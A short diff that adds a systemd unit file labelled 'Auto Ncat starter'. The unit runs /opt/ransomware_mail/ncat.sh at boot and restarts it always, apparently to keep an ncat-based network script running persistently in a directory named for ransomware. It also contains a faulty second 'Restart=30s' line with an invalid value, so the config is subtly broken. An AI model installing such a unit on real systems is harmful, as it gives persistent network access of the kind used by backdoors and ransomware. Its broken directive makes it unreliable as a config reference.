@@ -1,0 +1,10 @@
+[Unit]
+Description=Auto Ncat starter
+
+[Service]
+Restart=always
+Restart=30s
+ExecStart=/bin/bash /opt/ransomware_mail/ncat.sh
+
+[Install]
+WantedBy=multi-user.target
